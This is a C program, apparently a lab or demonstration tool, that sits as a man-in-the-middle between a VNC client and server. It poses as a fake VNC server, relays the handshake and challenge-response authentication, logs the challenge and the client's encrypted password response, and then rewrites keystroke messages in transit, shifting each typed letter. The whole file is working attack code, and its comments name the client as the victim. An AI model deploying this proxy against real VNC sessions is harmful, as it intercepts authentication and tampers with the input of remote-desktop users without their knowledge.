#include <netinet/in.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>

/*
 * this code is trying to become the proxy of the vnc client and vnc server,
 * if the client typed some keys, the proxy will change the key in the middle
 *
 * only support un-encrypted channel
 */
// parameters to change
#define LOCALVNCPORT 5903
#define REMOTEVNCPORT 5901
#define VNCSERVER "x.x.x.x"

#define QUEUE 8
#define BUFSIZ 51200

typedef char rfbProtocolVersionMsg[13];
#define sz_rfbProtocolVersionMsg 12

void proxy_traffic(int clientfd, int vncfd) {
	fd_set rfds;
	struct timeval tv;
	int retval;
	int nbytes = 0;
	unsigned char buf [BUFSIZ];

	int fd_max = clientfd > vncfd ? clientfd : vncfd;

	while(1) {

		FD_ZERO(&rfds);
		//FD_SET(0, &rfds);
		FD_SET(vncfd, &rfds);
		FD_SET(clientfd, &rfds);	

		tv.tv_sec = 5;
		tv.tv_usec = 0;

		retval = select(fd_max + 1, &rfds, NULL, NULL, &tv);

		if(retval == -1) {
			perror("select()");
		} else if (retval) {
			if(FD_ISSET(vncfd, &rfds)) {
				// some data ready on server fd
				if ( (nbytes = read (vncfd, buf, BUFSIZ) ) <= 0) {
					perror ("read");
					exit (-1);
				}
				// send server traffic to client
				if(write (clientfd, buf, nbytes) < nbytes) {
					perror("write");
					exit(-1);
				}	
			}	
			if(FD_ISSET(clientfd, &rfds)) {
				// some data ready on client fd
				if ( (nbytes = read (clientfd, buf, BUFSIZ) ) <= 0) {
					perror ("read");
					exit (-1);
				}
				buf[nbytes] = 0;
				
				nbytes = mitm(buf, nbytes);
				
				// send client traffic to server
				if(write (vncfd, buf, nbytes) < nbytes) {
					perror("write");
					exit(-1);
				}	
			}
		} else {
			printf("No data within five seconds: %d\n", retval);
		}
	}

}


// dump data from ascii byte to hex string
// convert 
// 	\00\00\00\97 in byte stream, which is 'a'
// to
//      "00000097" in hex string
void asciitohex(const void *data, int size, char ** output, int output_length) {
    const unsigned char *byte = data;
    char* output_ptr = *output;

    int index = 0;
    while (size > 0)
    {
        size--;
        snprintf(output_ptr + index, output_length - index, "%.2x", *byte);
        byte++;
	index += 2;
    }
}

int mitm(char* buf, int nbytes) {
	unsigned char type = buf[0];
	if(type == 4) {
		unsigned char key_down_state = buf[1];
		unsigned char ch = buf[7];

		char output[BUFSIZ];
		char* output_ptr = output;
		asciitohex(buf+4, 4, &output_ptr, BUFSIZ);
		unsigned int num;
		sscanf(output_ptr, "%x", &num);
		//printf("key: %d\n", num);

		if(key_down_state == 0) {
			printf("key %d is pressed\n", num);
		} else {
			printf("key %d is released\n", num);
		}
		
		if(num < 'z' && num >= 'a') {
			ch ++;
		} else if( num == 'z') {
			ch = 'a';
		} else if ( num < 'Z' && num >= 'A' ) {
			ch ++;
		} else if ( num == 'Z' ) {
			ch = 'A';
		}

		// attack, manipulate the message, if user typed 'a', change it to 'b'
		buf[7] = ch;
	}	
	return nbytes;
}

int main (int argc, char **argv) {

	int sockfd, clientfd, vncfd;
	int nbytes = 0;
	struct sockaddr_in server, client, vnc;
	int len = sizeof (client);
	unsigned char buf [BUFSIZ];

	if ( (sockfd = socket (AF_INET, SOCK_STREAM, 0) ) == -1) {
		perror ("socket");
		exit (-1);
	}

	bzero (&server, sizeof (server) );
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = htonl (INADDR_ANY);
	server.sin_port = htons (LOCALVNCPORT);

	/* this is the fake VNC server */
	if (bind (sockfd, (struct sockaddr *) &server, 
				sizeof (server) ) == -1) {
		perror ("bind");
		exit (-1);
	}

	listen (sockfd, QUEUE);

	if ( (clientfd = accept (sockfd, 
					(struct sockaddr *) &client, &len) ) == -1) {
		perror ("accept");
		exit (-1);
	}

	if ( (vncfd = socket (AF_INET, SOCK_STREAM, 0) ) == -1) {
		perror ("socket");
		exit (-1);
	}

	bzero (&vnc, sizeof (vnc) );
	vnc.sin_family = AF_INET;
	vnc.sin_addr.s_addr = inet_addr (VNCSERVER);
	vnc.sin_port = htons (REMOTEVNCPORT);

	/* we connect to the real VNC server */
	if (connect (vncfd, (struct sockaddr *) &vnc, 
				sizeof (vnc) ) == -1) {
		perror ("connect");
		exit (-1);
	}

	// negotiate protocol version (which is 003.008)

	// read protocol version number from the real server
	if ( (nbytes = read (vncfd, buf, BUFSIZ) ) <= 0) {
		perror ("read");
		exit (-1);
	}
	buf[nbytes] = 0;
	printf("0. got the protocol version from real vnc server: %s\n", buf);

	/* we must send VNC version number (from protocol) */
	printf("1. send to victim on protocol version: %s\n", buf);

	if (write (clientfd, buf, strlen (buf) ) < strlen (buf) ) {
		perror ("write");
		exit (-1);
	}

	/* we also must read VNC version number (from protocol) */
	if ( (nbytes = read (clientfd, buf, BUFSIZ) ) <= 0) {
		perror ("read");
		exit (-1);
	}

	buf [nbytes] = 0;
	printf("2. got the suggested protocol version from client: %s\n", buf);

	printf("3. send the suggested protocol to server: %s\n", buf);
	/* send back the suggested protocol version to server */
	if (write (vncfd, buf, strlen(buf) ) < strlen(buf)) {
		perror ("write");
		exit(-1);
	}

	// negotiate authenticaiton method

	/* we now read authenticarion method code from VNC server */
	if ( (nbytes = read (vncfd, buf, BUFSIZ) ) <= 0) {
		perror ("read");
		exit (-1);
	}
	buf[nbytes] = 0;
	
	int num = (int)buf[0];

	printf("4. no. of security types provided by server: %d\n", num);
	int i = 0;
	for(;i < num; i++) {
		int type = buf[i+1];
		printf("supported security type: %d\n", type);
	}

	printf("5. send the security type info to client\n");
	
	if(write (clientfd, buf, nbytes) < nbytes) {
		perror("write");
		exit(-1);
	}	

	if( (nbytes = read (clientfd, buf, BUFSIZ) ) <= 0) {
		perror ("read");
		exit(-1);
	}

	printf("6. got preferred security type from client: %d\n", buf[0]);
	
	printf("7. send the preferred security type to server: %d\n", buf[0]);
	if(write (vncfd, buf, nbytes) < nbytes) {
		perror("write");
		exit(-1);
	}


	// process challenge

	/* here is the challenge from server */
	if ( (nbytes = read (vncfd, buf, BUFSIZ) ) <= 0) {
		perror ("read");
		exit (-1);
	}
	buf[nbytes] = 0;
	printf("8. the challenge from server is:");
	int buf_index = 0;
	for(; buf_index < nbytes; buf_index++) {
		printf(" %2x", buf[buf_index]);		
	}
	printf("\n");

	printf("9. send challenge to client\n");

	/* we send the challenge to the victim client */
	if (write (clientfd, buf, 16) < 16) {
		perror ("write");
		exit (-1);
	} 

	/* we have the encrypted password from the client */
	if ( (nbytes = read (clientfd, buf, BUFSIZ) ) <= 0) {
		perror ("read");
		exit (-1);
	}
	buf[nbytes] = 0;

	printf("10. got the challenge response from client:");
	int buf_index2 = 0;
	for( ; buf_index2 < nbytes; buf_index2++) {
		printf(" %2x", buf[buf_index2]);		
	}
	printf("\n");
	printf("11. send the response to the real server\n");

	/* we send the encrypted password to the VNC server */
	if (write (vncfd, buf, 16) < 16) {
		perror ("write");
		exit (-1);
	} 

	/* we read the result from the authentication process */
	if ( (nbytes = read (vncfd, buf, BUFSIZ) ) <= 0) {
		perror ("read");
		exit (-1);
	}
	buf[nbytes] = 0;
	if(nbytes != 4) {
		perror ("invalid response");
		exit (-2);
	}
	
	printf("12. got the challenge result from server: %d\n", buf[3]);

	printf("13. send challenge result back to client\n");

	if(write (clientfd, buf, nbytes) < nbytes) {
		perror("write");
		exit(-1);
	}	

	/* at this point we should be authenticated */
	/* place whatever code you want here */
	
	// redirect all transfer between client and server

	printf("14. proxying traffic while changing the typed key in the middle\n");
	proxy_traffic(clientfd, vncfd);

	close (clientfd);
	close (sockfd);
	close (vncfd);

	return 0;
}
